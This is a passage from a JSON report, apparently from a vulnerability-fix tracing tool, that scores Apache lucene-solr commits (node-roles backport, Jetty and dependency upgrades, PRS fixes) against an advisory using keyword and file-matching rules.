                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/handler/designer/SampleDocumentsLoader.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "ace7641edb762d31519df1db845885dfd31caee4",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698605784,
            "hunks": 4,
            "message": "SOLR-15694, 15715: Create ephemeral roles properly (missed backporting these changes last time)",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/ZkController.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-15694": "I think we should have first class support for starting a Solr node in a mode whereby no cores will be placed on them. These nodes are useful for certain scenarios: Dedicated overseer nodes Nodes where only plugins are installed and used (e.g. cluster/node level plugins) Dedicated nodes for querying (more on this to come later). Today, to achieve this effect, one can: 1. start a node (which will make it join live_nodes and be immediately available for replica placement). 2. Put replica placement rules or autoscaling policies to prevent replicas from being placed there. This is not standardized, 8x has two ways to achieve this (replica placement rules and autoscaling framework), 9x has a new autoscaling framework. Proposing a start parameter for starting a node that starts the node in this configuration, and then internally this is handled appropriately (across 8x and 9x). This should be Kubernetes/Docker friendly as well, since it is easy to add an additional parameter for a startup (instead of putting things into autoscaling.json in ZK via init scripts). Concept of node roles and non-data nodes This has been discussed many times. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. One role coud be \"zk\", which would let the node start an embedded zookeeper (for a future managed zk feature), and then you could combine it with \"data\" if the node should also be eligible for index/search. There may be other roles such as \"streaming\" perhaps which would only host streaming expression jobs, etc. This is definitely SIP worthy. janhoy , thanks. That is good feedback. This has been discussed many times. Can you please point me to that? Will link to that in future discussions. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. Today, we have a role \"overseer\" for a node. However, many users look for dedicated overseer nodes (nodes that don't handle querying or indexing), and there's no easy way today. and then you could combine it with \"data\" if the node should also be eligible for index/search. Do you recommend that we have a role \"data\" for nodes (regular nodes as we have today)? In that case, what would absence of this \"data\" role for a node mean the node doesn't host any cores? This seems reasonable for what I intend to achieve with usecases I have in mind. This is definitely SIP worthy. I'll create one, thanks janhoy We already have a file /roles.json in ZK. It has a key called \"overseer\" now. We can add a new key called \"query-nodes\" and add nodes to that Ah, did not know about that. A thousand questions pop up, such as: Should roles be supported in leader/follower mode? What would be the best way to designate roles to a node? A global file in ZK like /roles.json is one way. ENV_VARs or SysProps at each node is another. How dynamic do we need this to be, are there business needs to (re)assign roles at runtime, and in that case do we need a REST API for it? If dynamic, what role(s) would a brand new node (or k8s pod) added to the cluster be assigned? What happens if you have only assigned a role to one node and that node leaves the cluster? Should that be configurable, or would there be some cluster level plugin monitoring events, that makes such decisions? etc etc Looking forward to seeing a SIP with a thorough design and recommendation on this. Looking forward to seeing a SIP with a thorough design and recommendation on this. I'll write up the SIP today. We can address these questions there and link to this JIRA. Here's the SIP: https://cwiki.apache.org/confluence/display/SOLR/SIP-15+Node+roles Discussion is happening here: https://lists.apache.org/thread.html/rb3cbfddb6e3af9c671d037ce1e7341544a2f1ab287f184c8f53ac44c%40%3Cdev.solr.apache.org%3E Browsing the other SIPs, SIP-11 is potentially related, as ir proposes some nice cleanup of accessing cluster-level config. Not saying we should not wait for that, but I'll ping ab to explore synergies. Commit 24e5ba7105ea774de0b319337c6809d2839b9f8a in solr's branch refs/heads/jira/SOLR15694 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=24e5ba7 ] SOLR-15694 : Ref guide changes Commit e32e58c20be0540c6e89679a57aac26616911e3d in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e32e58c ] SOLR-15694 : Node roles Commit e19a13f8146a713fe883c9a17809dc542638cc85 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e19a13f ] SOLR-15694 : Node roles Can you close this and also move SIP-15 to correct section in the list? https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ichattopadhyaya why is this till open? Also the SIP (see previous comment) is listed as \"under discussion\". I'll try once moce ichattopadhyaya noble.paul Can you please move the SIP-15 to the \"Implemented\" section here https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ? Done. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Commit 2da4332072ffffb0581ef60d11de5b0d157452ac in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2da4332072f ] SOLR-15694 , 15715: Node roles and dedicated query coordinator nodes Commit b54a788fe71c7f87a8b8564461cb196c138fc7ce in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=b54a788fe71 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Commit 002b3ce67bea7dfe114c3b7dfdceb00b8777363c in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=002b3ce67be ] Revert \" SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce. Commit ace7641edb762d31519df1db845885dfd31caee4 in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=ace7641edb7 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Hi ichattopadhyaya , We are trying to use the Node roles feature to set a preferred Overseer in our Solr 9 fork. What is the purpose of having overseerDesignate in addition to specifying a preferredOverseer ? How is it specified via startup parameters? In our fork, I am configuring one node in the SolrCloud cluster with -Dsolr.node.roles=overseer:preferred,data:on . All other nodes are set to overseer:allowed,data:on by default. I have observed that during a rolling restart, the OverseerNodePrioritizer almost always elects the preferred Overseer as the Overseer, provided it is up. Additionally, since the overseerDesignate list remains empty (until the preferred Overseer is added to it), it does not affect this outcome."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [
                [
                    "no-tag",
                    "b54a788fe71c7f87a8b8564461cb196c138fc7ce"
                ]
            ],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/ZkController.java",
                    "relevance": 8
                },
                {
                    "id": "COMMIT_HAS_TWINS",
                    "message": "This commit has one or more twins.",
                    "relevance": 2
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-15694",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "e7560cd2ab024d4315933cd3965aab2961bba994",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1697029674,
            "hunks": 60,
            "message": "SOLR-17025: Upgrade Jetty to 9.4.53.v20231009 (#2680)",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "lucene/licenses/jetty-continuation-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-continuation-9.4.53.v20231009.jar.sha1",
                "lucene/licenses/jetty-http-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-http-9.4.53.v20231009.jar.sha1",
                "lucene/licenses/jetty-io-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-io-9.4.53.v20231009.jar.sha1",
                "lucene/licenses/jetty-server-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-server-9.4.53.v20231009.jar.sha1",
                "lucene/licenses/jetty-servlet-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-servlet-9.4.53.v20231009.jar.sha1",
                "lucene/licenses/jetty-util-9.4.48.v20220622.jar.sha1",
                "lucene/licenses/jetty-util-9.4.53.v20231009.jar.sha1",
                "solr/licenses/http2-client-9.4.48.v20220622.jar.sha1",
                "solr/licenses/http2-client-9.4.53.v20231009.jar.sha1",
                "solr/licenses/http2-common-9.4.48.v20220622.jar.sha1",
                "solr/licenses/http2-common-9.4.53.v20231009.jar.sha1",
                "solr/licenses/http2-hpack-9.4.48.v20220622.jar.sha1",
                "solr/licenses/http2-hpack-9.4.53.v20231009.jar.sha1",
                "solr/licenses/http2-http-client-transport-9.4.48.v20220622.jar.sha1",
                "solr/licenses/http2-http-client-transport-9.4.53.v20231009.jar.sha1",
                "solr/licenses/http2-server-9.4.48.v20220622.jar.sha1",
                "solr/licenses/http2-server-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-alpn-client-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-alpn-client-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-alpn-java-client-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-alpn-java-client-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-alpn-java-server-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-alpn-java-server-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-alpn-server-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-alpn-server-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-client-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-client-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-continuation-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-continuation-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-deploy-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-deploy-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-http-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-http-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-io-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-io-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-jmx-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-jmx-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-rewrite-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-rewrite-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-security-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-security-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-server-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-server-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-servlet-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-servlet-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-servlets-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-servlets-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-util-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-util-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-webapp-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-webapp-9.4.53.v20231009.jar.sha1",
                "solr/licenses/jetty-xml-9.4.48.v20220622.jar.sha1",
                "solr/licenses/jetty-xml-9.4.53.v20231009.jar.sha1",
                "solr/licenses/start.jar.sha1"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-17025": "Keeping branch_8_11 up to date w/ the latest Jetty 9.4.53 Upgrade to Jetty 9.4.53 on branch_8_11 https://github.com/apache/lucene-solr/pull/2680 Commit e7560cd2ab024d4315933cd3965aab2961bba994 in lucene-solr's branch refs/heads/branch_8_11 from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=e7560cd2ab0 ] SOLR-17025 : Upgrade Jetty to 9.4.53.v20231009 (#2680) Closing after the 8.11.3 release"
            },
            "ghissue_refs": {
                "2680": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/licenses/jetty-server-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-rewrite-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-java-client-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-java-server-9.4.53.v20231009.jar.sha1, solr/licenses/http2-hpack-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-security-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-xml-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-http-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-java-server-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-util-9.4.48.v20220622.jar.sha1, solr/licenses/http2-http-client-transport-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-client-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-io-9.4.48.v20220622.jar.sha1, solr/licenses/http2-client-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-client-9.4.48.v20220622.jar.sha1, solr/licenses/http2-hpack-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-java-client-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-client-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-deploy-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-security-9.4.53.v20231009.jar.sha1, solr/licenses/start.jar.sha1, solr/licenses/jetty-continuation-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-rewrite-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-servlet-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-servlets-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-continuation-9.4.53.v20231009.jar.sha1, solr/licenses/http2-client-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-server-9.4.53.v20231009.jar.sha1, solr/licenses/http2-http-client-transport-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-client-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-webapp-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-deploy-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-servlet-9.4.48.v20220622.jar.sha1, solr/licenses/http2-common-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-xml-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-jmx-9.4.53.v20231009.jar.sha1, solr/licenses/http2-server-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-http-9.4.53.v20231009.jar.sha1, solr/licenses/http2-server-9.4.53.v20231009.jar.sha1, solr/licenses/http2-common-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-jmx-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-util-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-alpn-server-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-alpn-server-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-webapp-9.4.48.v20220622.jar.sha1, solr/licenses/jetty-io-9.4.53.v20231009.jar.sha1, solr/licenses/jetty-servlets-9.4.48.v20220622.jar.sha1",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: upgrade",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version, server",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-17025",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 2680",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "3cf0a5501084c9e3d0e53657a20477007f33755a",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698690763,
            "hunks": 88,
            "message": "Upgrade dependencies to address more CVEs (#2681) Upgrade the following dependencies: |dependency|old|new| |-------------|---|---| |ant|1.8.2|1.10.14| |randomizedtesting|2.7.2|2.8.1| |calcite|1.32.0|1.35.0| |calcite avatica|1.22.0|1.23.0| |aws java sdk|1.12.42|1.12.565| |caffeine|2.9.2|2.9.3| |hadoop|3.2.2|3.2.4| |jackson|2.13.5|2.15.2| |netty|4.1.87|4.1.99| |woodstox-core|6.5.0|6.5.1|",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "lucene/licenses/ant-1.10.14.jar.sha1",
                "lucene/licenses/ant-1.8.2.jar.sha1",
                "lucene/licenses/randomizedtesting-runner-2.7.2.jar.sha1",
                "lucene/licenses/randomizedtesting-runner-2.8.1.jar.sha1",
                "solr/licenses/ant-1.10.14.jar.sha1",
                "solr/licenses/ant-1.8.2.jar.sha1",
                "solr/licenses/avatica-core-1.22.0.jar.sha1",
                "solr/licenses/avatica-core-1.23.0.jar.sha1",
                "solr/licenses/avatica-metrics-1.22.0.jar.sha1",
                "solr/licenses/avatica-metrics-1.23.0.jar.sha1",
                "solr/licenses/aws-java-sdk-core-1.12.42.jar.sha1",
                "solr/licenses/aws-java-sdk-core-1.12.565.jar.sha1",
                "solr/licenses/aws-java-sdk-s3-1.12.42.jar.sha1",
                "solr/licenses/aws-java-sdk-s3-1.12.565.jar.sha1",
                "solr/licenses/caffeine-2.9.2.jar.sha1",
                "solr/licenses/caffeine-2.9.3.jar.sha1",
                "solr/licenses/calcite-core-1.32.0.jar.sha1",
                "solr/licenses/calcite-core-1.35.0.jar.sha1",
                "solr/licenses/calcite-linq4j-1.32.0.jar.sha1",
                "solr/licenses/calcite-linq4j-1.35.0.jar.sha1",
                "solr/licenses/hadoop-annotations-3.2.2.jar.sha1",
                "solr/licenses/hadoop-annotations-3.2.4.jar.sha1",
                "solr/licenses/hadoop-auth-3.2.2.jar.sha1",
                "solr/licenses/hadoop-auth-3.2.4.jar.sha1",
                "solr/licenses/hadoop-common-3.2.2-tests.jar.sha1",
                "solr/licenses/hadoop-common-3.2.2.jar.sha1",
                "solr/licenses/hadoop-common-3.2.4-tests.jar.sha1",
                "solr/licenses/hadoop-common-3.2.4.jar.sha1",
                "solr/licenses/hadoop-hdfs-3.2.2-tests.jar.sha1",
                "solr/licenses/hadoop-hdfs-3.2.2.jar.sha1",
                "solr/licenses/hadoop-hdfs-3.2.4-tests.jar.sha1",
                "solr/licenses/hadoop-hdfs-3.2.4.jar.sha1",
                "solr/licenses/hadoop-hdfs-client-3.2.2.jar.sha1",
                "solr/licenses/hadoop-hdfs-client-3.2.4.jar.sha1",
                "solr/licenses/hadoop-minicluster-3.2.2.jar.sha1",
                "solr/licenses/hadoop-minicluster-3.2.4.jar.sha1",
                "solr/licenses/hadoop-minikdc-3.2.2.jar.sha1",
                "solr/licenses/hadoop-minikdc-3.2.4.jar.sha1",
                "solr/licenses/jackson-annotations-2.13.5.jar.sha1",
                "solr/licenses/jackson-annotations-2.15.2.jar.sha1",
                "solr/licenses/jackson-core-2.13.5.jar.sha1",
                "solr/licenses/jackson-core-2.15.2.jar.sha1",
                "solr/licenses/jackson-databind-2.13.5.jar.sha1",
                "solr/licenses/jackson-databind-2.15.2.jar.sha1",
                "solr/licenses/jackson-dataformat-smile-2.13.5.jar.sha1",
                "solr/licenses/jackson-dataformat-smile-2.15.2.jar.sha1",
                "solr/licenses/jackson-dataformat-xml-2.13.5.jar.sha1",
                "solr/licenses/jackson-dataformat-xml-2.15.2.jar.sha1",
                "solr/licenses/jackson-datatype-jdk8-2.13.5.jar.sha1",
                "solr/licenses/jackson-datatype-jdk8-2.15.2.jar.sha1",
                "solr/licenses/jackson-datatype-jsr310-2.13.5.jar.sha1",
                "solr/licenses/jackson-datatype-jsr310-2.15.2.jar.sha1",
                "solr/licenses/jackson-module-jaxb-annotations-2.13.5.jar.sha1",
                "solr/licenses/jackson-module-jaxb-annotations-2.15.2.jar.sha1",
                "solr/licenses/jackson-module-parameter-names-2.13.5.jar.sha1",
                "solr/licenses/jackson-module-parameter-names-2.15.2.jar.sha1",
                "solr/licenses/junit4-ant-2.7.2.jar.sha1",
                "solr/licenses/junit4-ant-2.8.1.jar.sha1",
                "solr/licenses/netty-all-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-all-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-buffer-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-buffer-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-codec-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-codec-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-common-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-common-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-handler-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-handler-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-resolver-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-resolver-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-transport-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-transport-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-transport-native-epoll-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-transport-native-epoll-4.1.99.Final.jar.sha1",
                "solr/licenses/netty-transport-native-unix-common-4.1.87.Final.jar.sha1",
                "solr/licenses/netty-transport-native-unix-common-4.1.99.Final.jar.sha1",
                "solr/licenses/randomizedtesting-runner-2.7.2.jar.sha1",
                "solr/licenses/randomizedtesting-runner-2.8.1.jar.sha1",
                "solr/licenses/woodstox-core-6.5.0.jar.sha1",
                "solr/licenses/woodstox-core-6.5.1.jar.sha1"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {
                "2681": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/licenses/aws-java-sdk-s3-1.12.565.jar.sha1, solr/licenses/hadoop-common-3.2.2.jar.sha1, solr/licenses/netty-handler-4.1.87.Final.jar.sha1, solr/licenses/netty-transport-native-epoll-4.1.99.Final.jar.sha1, solr/licenses/netty-buffer-4.1.99.Final.jar.sha1, solr/licenses/jackson-datatype-jsr310-2.15.2.jar.sha1, solr/licenses/jackson-databind-2.13.5.jar.sha1, solr/licenses/jackson-databind-2.15.2.jar.sha1, solr/licenses/hadoop-minicluster-3.2.4.jar.sha1, solr/licenses/jackson-dataformat-smile-2.13.5.jar.sha1, solr/licenses/jackson-core-2.15.2.jar.sha1, solr/licenses/calcite-core-1.35.0.jar.sha1, solr/licenses/hadoop-common-3.2.2-tests.jar.sha1, solr/licenses/jackson-annotations-2.15.2.jar.sha1, solr/licenses/hadoop-auth-3.2.4.jar.sha1, solr/licenses/hadoop-minikdc-3.2.2.jar.sha1, solr/licenses/jackson-dataformat-smile-2.15.2.jar.sha1, solr/licenses/jackson-module-jaxb-annotations-2.15.2.jar.sha1, solr/licenses/aws-java-sdk-s3-1.12.42.jar.sha1, solr/licenses/jackson-dataformat-xml-2.13.5.jar.sha1, solr/licenses/netty-transport-4.1.87.Final.jar.sha1, solr/licenses/ant-1.8.2.jar.sha1, solr/licenses/randomizedtesting-runner-2.8.1.jar.sha1, solr/licenses/hadoop-auth-3.2.2.jar.sha1, solr/licenses/hadoop-annotations-3.2.2.jar.sha1, solr/licenses/hadoop-hdfs-3.2.2.jar.sha1, solr/licenses/hadoop-hdfs-3.2.4.jar.sha1, solr/licenses/jackson-module-parameter-names-2.13.5.jar.sha1, solr/licenses/netty-transport-native-epoll-4.1.87.Final.jar.sha1, solr/licenses/netty-transport-native-unix-common-4.1.99.Final.jar.sha1, solr/licenses/randomizedtesting-runner-2.7.2.jar.sha1, solr/licenses/woodstox-core-6.5.0.jar.sha1, solr/licenses/netty-all-4.1.87.Final.jar.sha1, solr/licenses/aws-java-sdk-core-1.12.565.jar.sha1, solr/licenses/jackson-module-parameter-names-2.15.2.jar.sha1, solr/licenses/hadoop-hdfs-3.2.4-tests.jar.sha1, solr/licenses/jackson-core-2.13.5.jar.sha1, solr/licenses/netty-transport-4.1.99.Final.jar.sha1, solr/licenses/avatica-core-1.23.0.jar.sha1, solr/licenses/jackson-datatype-jsr310-2.13.5.jar.sha1, solr/licenses/ant-1.10.14.jar.sha1, solr/licenses/avatica-core-1.22.0.jar.sha1, solr/licenses/hadoop-minikdc-3.2.4.jar.sha1, solr/licenses/jackson-module-jaxb-annotations-2.13.5.jar.sha1, solr/licenses/junit4-ant-2.8.1.jar.sha1, solr/licenses/netty-common-4.1.87.Final.jar.sha1, solr/licenses/netty-resolver-4.1.87.Final.jar.sha1, solr/licenses/netty-resolver-4.1.99.Final.jar.sha1, solr/licenses/hadoop-hdfs-client-3.2.2.jar.sha1, solr/licenses/hadoop-annotations-3.2.4.jar.sha1, solr/licenses/junit4-ant-2.7.2.jar.sha1, solr/licenses/caffeine-2.9.2.jar.sha1, solr/licenses/woodstox-core-6.5.1.jar.sha1, solr/licenses/netty-transport-native-unix-common-4.1.87.Final.jar.sha1, solr/licenses/hadoop-common-3.2.4.jar.sha1, solr/licenses/hadoop-hdfs-3.2.2-tests.jar.sha1, solr/licenses/netty-handler-4.1.99.Final.jar.sha1, solr/licenses/calcite-core-1.32.0.jar.sha1, solr/licenses/jackson-datatype-jdk8-2.15.2.jar.sha1, solr/licenses/netty-all-4.1.99.Final.jar.sha1, solr/licenses/calcite-linq4j-1.35.0.jar.sha1, solr/licenses/hadoop-hdfs-client-3.2.4.jar.sha1, solr/licenses/netty-codec-4.1.87.Final.jar.sha1, solr/licenses/netty-buffer-4.1.87.Final.jar.sha1, solr/licenses/avatica-metrics-1.22.0.jar.sha1, solr/licenses/avatica-metrics-1.23.0.jar.sha1, solr/licenses/jackson-annotations-2.13.5.jar.sha1, solr/licenses/jackson-datatype-jdk8-2.13.5.jar.sha1, solr/licenses/aws-java-sdk-core-1.12.42.jar.sha1, solr/licenses/netty-codec-4.1.99.Final.jar.sha1, solr/licenses/caffeine-2.9.3.jar.sha1, solr/licenses/hadoop-minicluster-3.2.2.jar.sha1, solr/licenses/hadoop-common-3.2.4-tests.jar.sha1, solr/licenses/calcite-linq4j-1.32.0.jar.sha1, solr/licenses/netty-common-4.1.99.Final.jar.sha1, solr/licenses/jackson-dataformat-xml-2.15.2.jar.sha1",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: address, upgrade",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version, handler, parameter",
                    "relevance": 4
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 2681",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "a442489af3c665e1d87c38bef1b5864dd48129a7",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698645339,
            "hunks": 8,
            "message": "Some PRS fixes ported (addressing test failures with PRS)",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/api/collections/OverseerCollectionMessageHandler.java",
                "solr/core/src/java/org/apache/solr/cloud/autoscaling/sim/SimClusterStateProvider.java",
                "solr/core/src/java/org/apache/solr/handler/admin/CollectionsHandler.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/handler/admin/CollectionsHandler.java, solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java, solr/core/src/java/org/apache/solr/cloud/autoscaling/sim/SimClusterStateProvider.java, solr/core/src/java/org/apache/solr/cloud/api/collections/OverseerCollectionMessageHandler.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: address",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, provide",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "962c926010635356ea778374e1fad5e40f0b46be",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698088228,
            "hunks": 46,
            "message": "Miscellaneous PRS fixes, backported from 9.x Co-authored-by: Noble Paul <noble@apache.org>",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/ShardLeaderElectionContextBase.java",
                "solr/core/src/java/org/apache/solr/cloud/ZkController.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/overseer/ReplicaMutator.java",
                "solr/core/src/java/org/apache/solr/cloud/overseer/SliceMutator.java",
